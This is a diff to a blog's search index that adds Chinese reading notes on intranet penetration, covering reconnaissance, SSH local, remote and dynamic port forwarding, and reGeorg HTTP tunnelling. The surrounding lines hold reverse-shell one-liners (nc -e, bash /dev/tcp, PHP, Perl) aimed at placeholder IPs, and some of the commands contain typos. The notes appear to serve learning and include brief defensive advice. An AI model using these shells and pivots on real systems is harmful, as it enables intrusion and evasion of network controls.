@@ -5089,7 +5089,7 @@
     <url>/2020/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/</url>
     <content><![CDATA[<hr>
 <a id="more"></a>
-<h1 id="内网基础"><a href="#内网基础" class="headerlink" title="内网基础"></a>内网基础</h1><h2 id="内网基础知识"><a href="#内网基础知识" class="headerlink" title="内网基础知识"></a>内网基础知识</h2><p>内网又称局域网，是指在某一区域内由多台计算机互联而成的计算机组。</p>
+<h1 id="内网基础"><a href="#内网基础" class="headerlink" title="内网基础"></a>内网基础</h1><h2 id="一、内网基础知识"><a href="#一、内网基础知识" class="headerlink" title="一、内网基础知识"></a>一、内网基础知识</h2><p>内网又称局域网，是指在某一区域内由多台计算机互联而成的计算机组。</p>
 <h4 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h4><p>将不同的计算机按功能分成不同的组，即工作组。</p>
 <p><img src="/2020/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image-20201224204924127.png" alt="image-20201224204924127"></p>
 <h4 id="域"><a href="#域" class="headerlink" title="域"></a>域</h4><ul>
@@ -5256,7 +5256,7 @@
 <li>PowerSploit</li>
 <li>Nishang</li>
 </ul>
-<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><p>当进入内网后，首先要对当前所处的网络环境进行判断。包括：</p>
+<h1 id="二、内网信息收集"><a href="#二、内网信息收集" class="headerlink" title="二、内网信息收集"></a>二、内网信息收集</h1><p>当进入内网后，首先要对当前所处的网络环境进行判断。包括：</p>
 <ul>
 <li>对当前机器角色的判断</li>
 <li>对当前机器所处网络环境的拓扑结构进行分析和判断</li>
@@ -5649,7 +5649,7 @@
 <h4 id="敏感信息及文件"><a href="#敏感信息及文件" class="headerlink" title="敏感信息及文件"></a>敏感信息及文件</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">站点源码备份文件、数据库备份文件</span><br><span class="line"></span><br><span class="line">各类数据库的web管理入口</span><br><span class="line"></span><br><span class="line">浏览器密码和浏览器cookie</span><br><span class="line"></span><br><span class="line">其他用户会话、3389、ipc$连接记录</span><br><span class="line"></span><br><span class="line">网络内部的各种账号和密码，包括电子邮箱、VPN、FTP、Teamview</span><br></pre></td></tr></table></figure>
 <h2 id="域内拓扑结构"><a href="#域内拓扑结构" class="headerlink" title="域内拓扑结构"></a>域内拓扑结构</h2><p>常见的一些web架构：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ASP+Acess+IIS5.0&#x2F;6.0+Windows server2003</span><br><span class="line"></span><br><span class="line">ASPX+MSSQL+IIS7.0&#x2F;7.5+Windows server2008</span><br><span class="line"></span><br><span class="line">PHP+MYSQL+IIS</span><br><span class="line"></span><br><span class="line">PHP+MYSQL+Apache</span><br><span class="line"></span><br><span class="line">PHP+MYSQL+Nginx</span><br><span class="line"></span><br><span class="line">JSP+MYSQL+Nginx</span><br><span class="line"></span><br><span class="line">JSP+MYSQL+Tomcat</span><br><span class="line"></span><br><span class="line">JSP+Oracle+Tomcat</span><br></pre></td></tr></table></figure>
-<h1 id="隐蔽通信隧道技术"><a href="#隐蔽通信隧道技术" class="headerlink" title="隐蔽通信隧道技术"></a>隐蔽通信隧道技术</h1><h2 id="隧道通信基础"><a href="#隧道通信基础" class="headerlink" title="隧道通信基础"></a>隧道通信基础</h2><p>一般网络通信中，先在两台机器中间建立TCP连接，然后进行正常的数据通信。知道IP的情况下，可以直接发送报文；如果不知道IP地址，需要将域名解析为IP地址。在实际网络中，会通过各种边界设备、软硬防火墙、入侵检测设备来检查对外连接情况，发现异常，就会进行阻断。</p>
+<h1 id="三、隐蔽通信隧道技术"><a href="#三、隐蔽通信隧道技术" class="headerlink" title="三、隐蔽通信隧道技术"></a>三、隐蔽通信隧道技术</h1><h2 id="隧道通信基础"><a href="#隧道通信基础" class="headerlink" title="隧道通信基础"></a>隧道通信基础</h2><p>一般网络通信中，先在两台机器中间建立TCP连接，然后进行正常的数据通信。知道IP的情况下，可以直接发送报文；如果不知道IP地址，需要将域名解析为IP地址。在实际网络中，会通过各种边界设备、软硬防火墙、入侵检测设备来检查对外连接情况，发现异常，就会进行阻断。</p>
 <p>什么是隧道？这里的隧道，就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方通信。当被封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应的服务器上。</p>
 <p>常见的隧道包括：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">网络层：</span><br><span class="line">IPV6隧道、ICMP隧道、GRE隧道</span><br><span class="line"></span><br><span class="line">传输层：</span><br><span class="line">TCP隧道、UDP隧道、常规端口转发</span><br><span class="line"></span><br><span class="line">应用层：</span><br><span class="line">SSH隧道、HTTP隧道、HTTPS隧道、DNS隧道</span><br></pre></td></tr></table></figure>
@@ -5718,6 +5718,45 @@
 <p>正向shell：客户端连接服务器，客户端想获取服务器的shell</p>
 <p>反向shell：客户端连接服务器，服务器想获取客户端的shell</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">（1）正向shell</span><br><span class="line">nc -lvp 4444 -e &#x2F;bin&#x2F;sh     &#x2F;&#x2F;Linux</span><br><span class="line">nc -lvp 4444 -e C:\windows\system32\cmd.exe    &#x2F;&#x2F;Windows</span><br><span class="line">在本机或VPS上输入：nc xxx.x.xxx.x  4444</span><br><span class="line"></span><br><span class="line">（2）反向shell</span><br><span class="line">本地监听：nc -lvp 9999</span><br><span class="line">目标主机：</span><br><span class="line">nc xx.xx.xx.xxx 999 -e &#x2F;bin&#x2F;sh      &#x2F;&#x2F;Linux</span><br><span class="line">nc xxx.xx.xxxx.xx 999 -e c:\windows\system32\cmd.exe   &#x2F;&#x2F;Windows</span><br><span class="line"></span><br><span class="line">（3）Bash反向shell</span><br><span class="line">本地：nc -lvp 4444</span><br><span class="line">目标：bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xxx.xxx.xxx.xx&#x2F;4444 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">（4）PHP反向shell</span><br><span class="line">本地：nc -lvp 2222</span><br><span class="line">目标：php -r &#39;sock&#x3D;fsockopen(&quot;xxx.xxx.xx.xx&quot;，2222)；exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br><span class="line"></span><br><span class="line">（5）Perl反向shell</span><br><span class="line">本地：nc -lvp 4444</span><br><span class="line">目标：perl -e &#39;use Socket;$i&#x3D;&quot;192.168.1.23&quot;;$p&#x3D;4444;socket(S,PF_INEF,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN，&quot;&gt;&amp;S&quot;)open(STDOUT，&quot;&gt;&amp;S&quot;);open(STDERR，&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure>
+<h2 id="应用层隧道技术"><a href="#应用层隧道技术" class="headerlink" title="应用层隧道技术"></a>应用层隧道技术</h2><h3 id="SSH协议"><a href="#SSH协议" class="headerlink" title="SSH协议"></a>SSH协议</h3><p>在内网中，几乎所有的Linux都支持SSH协议。在一般情况下SSH协议是允许通过防火墙和边界设备的，所以经常被利用。</p>
+<p>创建SSH隧道的参数说明：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-C：压缩传输</span><br><span class="line">-f：将ssh传输后台执行，不占用当前shell</span><br><span class="line">-N：建立静默连接,即看不到具体会话</span><br><span class="line">-g：允许远程主机建立本地用于转发的端口</span><br><span class="line">-L：本地端口转发</span><br><span class="line">-R：远程端口转发</span><br><span class="line">-D：动态转发（socks代理）、</span><br><span class="line">-P：指定SSH端口</span><br></pre></td></tr></table></figure>
+<h4 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h4><p>场景如下：一个小型内网，包含三台服务器；外部VPS可以访问内网web服务器，但不能访问数据库服务器；内网web服务器和数据库服务器可以相互访问。目标是以web服务器为跳板，访问数据库服务器的3389端口。</p>
+<p><img src="/2020/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image-20210630220026960.png" alt="image-20210630220026960"></p>
+<p>以web服务器192.168.1.11为跳板，将内网数据库服务器1.1.1.10的3389端口映射到VPS机器192.168.1.4的1110端口，再访问VPS的1110端口，就相当于访问1.1.1.10的3389端口了。</p>
+<p>在VPS上执行如下命令，会要求输入web服务器的密码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -CfNg -L 1110（VPS端口):1.1.1.10（目标主机）:3389（目标端口） root@192.168.1.11（跳板机）</span><br></pre></td></tr></table></figure>
+<p>执行如下命令，查看本地1110端口是否已经连接。在进行本地映射时，本地的SSH进程会监控1110端口，如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -tulnp |grep 1110</span><br></pre></td></tr></table></figure>
+<p>连接数据库的3389端口：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdesktop 127.0.0.1</span><br></pre></td></tr></table></figure>
+<p>SSH的本地端口映射可以将本地的某个端口转发到远端指定机器的指定端口；本地端口转发则是在本地监听一个端口，所有访问这个端口的数据都会通过SSH隧道传输到远端的对应端口。</p>
+<h4 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h4><p>场景如下：攻击者VPS为kali Linux；一个小型内网包含三台服务器；内网没有边界设备，所以外部VPS不能访问内网中的三台服务器；内网web服务器可以访问外网VPS，数据库服务器和域控制器均不能访问外网VPS。目标是通过外网VPS访问数据库服务器的3389端口。</p>
+<p><img src="/2020/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image-20210630221220748.png" alt="image-20210630221220748"></p>
+<p>以web服务器为跳板，将VPS的3000端口的流量转发到1.1.1.10的3389端口，然后访问VPS的3000端口，就可以访问1.1.1.10的3389端口了。</p>
+<p>在web服务器执行如下命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -CfNg -R 3000(VPS端口)：1.1.1.10（目标主机）：3389(目标端口) root@192.168.1.4</span><br></pre></td></tr></table></figure>
+<p>在本地访问VPS的3000端口，就已经与数据库服务器的1.1.1.10的3389端口建立了连接，如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdesktop 127.0.0.1:3000</span><br></pre></td></tr></table></figure>
+<p>本地转发是将远程主机某个端口的数据转发到本地机器的指定端口。远程端口转发则是在远程主机上监听一个端口，所有访问远程服务器指定端口的数据都会通过SSH隧道传输到本地的对应端口。</p>
+<h4 id="动态转发"><a href="#动态转发" class="headerlink" title="动态转发"></a>动态转发</h4><p>拓扑如下：</p>
+<p><img src="/2020/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image-20210630222623652.png" alt="image-20210630222623652"></p>
+<p>在VPS上执行如下命令，建立一个动态SOCKS 4/5代理通道，输入web服务器的密码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -CfNg -D root@192.168.1.11</span><br></pre></td></tr></table></figure>
+<p>接下来，在本地打开浏览器，设置网络代理。通过浏览器访问内网域控制器1.1.1.2。</p>
+<p>输入如下命令，查看本地7000端口是否已经连接。可以看到，在使用动态映射时，本地主机的SSH正在监听7000端口，如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -tulnp | greop &quot;:7000&quot;</span><br></pre></td></tr></table></figure>
+<p>动态端口映射就是建立一个SSH加密的SOCKS 4/5代理通道。任何支持SOCKS4/5协议的程序都可以使用这个加密通道进行代理访问。</p>
+<p><img src="/2020/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/image-20210630223722953.png" alt="image-20210630223722953"></p>
+<h4 id="防御SSH隧道攻击"><a href="#防御SSH隧道攻击" class="headerlink" title="防御SSH隧道攻击"></a>防御SSH隧道攻击</h4><p>SSH隧道之所以能被攻击者利用，主要是因为系统访问控制措施不够。在系统中配置SSH远程管理白名单，在ACL中限制只有特定的IP地址才能连接SSH，以及设置系统完全使用带外管理等方法。</p>
+<p>在内网中至少要限制SSH远程登录的地址和双向访问控制策略（从外部到内部，从内部到外部）。</p>
+<h3 id="HTTP-HTTPS协议"><a href="#HTTP-HTTPS协议" class="headerlink" title="HTTP/HTTPS协议"></a>HTTP/HTTPS协议</h3><p>HTTP Service代理用于将所有的流量转发到内网。常用的代理工具有reGeorg、meterpreter、tunna等。</p>
+<p>reGeorg是reDuh的升级版，主要功能是把内网服务器端口的数据通过HTTP/HTTPS隧道转发到本机，实现基于HTTP协议的通信。reGeorg脚本的特征非常明显，很多杀毒软件都会对其进行查杀。reGeorg支持ASPX、PHP、JSP等web脚本，并特别提供一个Tomcat5版本。</p>
+<p>将脚本文件上传到目标服务器中，使用kali Linux在本地访问远程服务器上的tunnl.jsp文件。返回后，利用reGeorgSocksProxy.py 脚本监听本地的9999端口，即可建立一个通信链路。</p>
+<p>输入如下命令，查看本地端口：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -u http:&#x2F;&#x2F;192.168.184.149:8080&#x2F;tunnel.jsp -p 9999</span><br></pre></td></tr></table></figure>
+<p>隧道正常工作之后，可以在本地kali Linux使用ProxyChains之类的工具，访问内网中的资源。</p>
+<p>传统的web服务器通常不会将本地的3389端口开放到公网，攻击者的暴力破解行为也很容易被传统的安全设备捕获。但是，如果使用HTTP隧道进行隧道转发，不仅攻击者可以直接访问web服务器的3389端口，而且暴力破解所产生的流量的特征也不明显。</p>
 ]]></content>
       <categories>
         <category>读书笔记</category>
